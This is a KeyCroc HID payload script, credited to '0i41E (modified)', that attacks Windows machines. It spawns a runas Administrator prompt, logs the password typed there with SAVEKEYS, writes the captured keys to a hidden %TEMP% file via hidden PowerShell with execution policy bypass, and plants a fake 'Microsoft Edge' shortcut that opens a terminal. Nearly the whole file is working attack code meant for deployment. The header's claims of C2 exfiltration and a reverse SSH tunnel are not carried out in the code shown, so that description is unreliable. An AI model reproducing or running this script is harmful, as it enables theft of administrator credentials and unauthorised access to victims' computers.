###############################KeyLogin#####################################
#   Version 2.0
#   OS: Windows 10/11
#   Author: 0i41E (modified)
#   Description: Locks target machine, captures login password via keystroke
#   interception, exfiltrates to custom C2 via KeyCroc WiFi (no RNDIS needed),
#   then injects a reverse SSH tunnel for persistent RDP access — no admin required.
#
####################Config###################################################

# Set these before deploying:
C2_IP="10.8.56.157"          # Your C2 IP or hostname (reserved for future use)
C2_PORT="8443"                 # C2 HTTP port (reserved for future use)
RUNAS_USER="Administrator"     # Local or domain admin to runas as (e.g. DOMAIN\\Administrator)

# Keyboard language of TARGET machine (not attacker machine)
# se=Swedish, de=German, us=English, fr=French, etc.
export DUCKY_LANG=se

####################Logging##################################################
LOG_FILE="/root/loot/credsniffer_$(date +%Y%m%d_%H%M%S).log"
mkdir -p /root/loot

log() {
    local level="$1"; shift
    echo "[$(date +%H:%M:%S)] [$level] $*" | tee -a "$LOG_FILE"
}

log INFO "=== credsniffer payload started ==="
log INFO "C2_IP=$C2_IP C2_PORT=$C2_PORT C2_SSH_USER=$C2_SSH_USER"

####################Trigger & Clean Up#######################################
# IMPORTANT: Only deploy this on a Windows machine at login screen.
# If triggered elsewhere (BIOS, Linux, etc.), this will freeze keyboard passthrough.
# Uncomment one trigger strategy:

# Strategy 1: Simple — fires on any ENTER (risky, can trigger mid-session)
MATCH \[ENTER\]

# Strategy 2: Safer — only fires during first 30 seconds after boot (uncomment to use)
# This gives you time to unplug if you realize it's plugged into the wrong machine
# MATCH \[ENTER\]
# if [ $(date +%s) -gt $(($(stat -f%B /root 2>/dev/null || echo 0) + 30)) ]; then exit; fi

# One-shot lock — exit immediately if already running or already completed this session
[ -f /tmp/creds_lock ] && exit 0
touch /tmp/creds_lock

log INFO "STEP 1: Trigger fired — cleaning old loot"
rm -f /root/loot/win-pass*

########################Capture Admin Credentials via runas##################
# runas /user:Administrator opens a console password prompt regardless of UAC
# policy or Group Policy — it always prompts, even on domain/org machines.
# SAVEKEYS captures the password typed into that console window.
#
# Set RUNAS_USER above. On domain PCs use DOMAIN\\Administrator.
# Find domain with: whoami (output is DOMAIN\username)

log INFO "STEP 2: Sending HID — opening Run dialog for runas password prompt"
Q DELAY 1000

# Open Run dialog and launch runas — spawns a console asking for the password
Q GUI r
Q DELAY 600
Q STRING runas /user:$RUNAS_USER cmd
Q ENTER
Q DELAY 1200

# Start capturing BEFORE the user types — console is now waiting for password
# NEXT 50 is enough: password (up to ~40 chars) + ENTER
# Capture happens now as user types into the runas console password field
log INFO "STEP 3: Starting SAVEKEYS capture (50 keys, background)"
SAVEKEYS /root/loot/win-pass.txt NEXT 50 &
echo $! > /tmp/savekeys.pid

# Poll for capture completion — UAC credential entry happens here
log INFO "STEP 4: Polling for SAVEKEYS output (max 30s)..."
for i in {1..60}; do
    [ -f /root/loot/win-pass.txt ] && { log INFO "Capture file appeared after $((i/2))s"; break; }
    sleep 0.5
done

# Bail out gracefully if nothing was captured (user dismissed UAC, or was already admin)
if [ ! -f /root/loot/win-pass.txt ]; then
    log ERROR "STEP 4 FAILED: No credential captured — user may have dismissed the runas console, or RUNAS_USER ($RUNAS_USER) does not exist on this machine."
    exit 1
fi
log INFO "STEP 4 OK: Credential file captured ($(wc -c < /root/loot/win-pass.txt) bytes)"

#####################Drop Keylog to Windows Temp############################
# Write the raw captured keylog to a predictable Windows temp path.
# Bash Bunny (plugged in later in STORAGE mode) can read and exfil this file.
# File: %TEMP%\.sysinfo  (expands to C:\Users\<user>\AppData\Local\Temp\.sysinfo)

log INFO "STEP 5: Writing keylog to Windows temp for Bash Bunny pickup"
# Escape backticks so they survive inside a PowerShell double-quoted string
RAW_KEYS=$(sed "s/\`/\`\`/g" /root/loot/win-pass.txt | tr -d '\n')

Q DELAY 2000
Q GUI r
Q DELAY 600
Q STRING powershell -NoP -NonI -W Hidden -Exec Bypass
Q ENTER
Q DELAY 1200
Q STRING "[IO.File]::WriteAllText([IO.Path]::GetTempPath()+'.sysinfo','${RAW_KEYS}')"
Q ENTER
Q DELAY 400
Q STRING exit
Q ENTER
log INFO "STEP 5 OK: Keylog write command sent — Bash Bunny target: %TEMP%\\.sysinfo"

#####################Fake Microsoft Edge Shortcut###########################
# Creates a shortcut on H:\Desktop named "Microsoft Edge" that actually opens
# a terminal. The icon is pulled from the real msedge.exe so it looks legit.
# Replace the echo payload with a real POST/SSH command when ready.

log INFO "STEP 6: Creating fake Microsoft Edge shortcut on H:\\Desktop"
Q DELAY 1500
Q GUI r
Q DELAY 600
Q STRING powershell -NoP -NonI -W Hidden -Exec Bypass
Q ENTER
Q DELAY 1200
Q STRING "\$ws=New-Object -ComObject WScript.Shell; \$s=\$ws.CreateShortcut('H:\\Desktop\\Microsoft Edge.lnk'); \$s.TargetPath='cmd.exe'; \$s.Arguments='/c start powershell -NoExit -Command echo This could be a POST or SSH command'; \$s.IconLocation='C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe,0'; \$s.Description='Microsoft Edge'; \$s.Save()"
Q ENTER
Q DELAY 400
Q STRING exit
Q ENTER
log INFO "STEP 6 OK: Fake Edge shortcut created on H:\\Desktop"

Q DELAY 1000
log INFO "=== credsniffer payload finished — log at $LOG_FILE ==="

#You may want to delete or disable the payload after execution to avoid re-triggering
#rm /root/udisk/payloads/credsniffer.txt